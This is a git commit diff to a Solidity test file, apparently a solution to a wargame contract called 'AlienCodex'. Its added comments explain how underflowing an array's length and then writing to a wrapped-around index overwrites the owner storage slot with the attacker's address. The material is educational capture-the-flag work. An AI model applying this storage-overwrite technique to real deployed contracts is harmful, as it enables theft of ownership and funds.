d2cc22b1a147ed2298923f9e0de56357c5750d0f
voith <voithjm1@gmail.com>
2023-01-23 18:23:11 +0530

    clean up and add some comments on why the code works

--- test/AlienCodex.t.sol
+++ test/AlienCodex.t.sol
@@ -26,9 +26,22 @@ contract TestAlienCodex is Test {
         alienCodex.make_contact();
         assertEq(alienCodex.contact(), true);
         alienCodex.retract();
-        console.logBytes32(vm.load(alienCodexAddress, bytes32(uint(1))));
         bytes32 arrayStartPosition = keccak256(abi.encodePacked(uint256(1)));
         unchecked {
+            // x[i] = k will be set in the following way:
+            // storage slot will be calculated using: startPosition + index
+            // https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/
+            // startPosition is calculated as keccak256(slot of x)
+            // index here refers to variable i or the position in the array
+            // However, in order to set any position in the array; array.length > position
+            // This check is bypassed using alienCodex.retract() as it causes the length to overflow
+            // The next trick is to trick the array indexing to point to the owner storage slot
+            // owner storage slot in the contract is 0
+            // so here's the trick:
+            // startPosition + (type(uint).max + 1 - startPosition)
+            // = type(uint).max + 1 = 0(overflow)
+            // so if we provide (type(uint).max + 1 - startPosition) as input to revise
+            // then that should index the owner slot
             uint position = type(uint).max + 1 - uint(arrayStartPosition);
             alienCodex.revise(position, bytes32(uint(uint160(attacker))));
         }
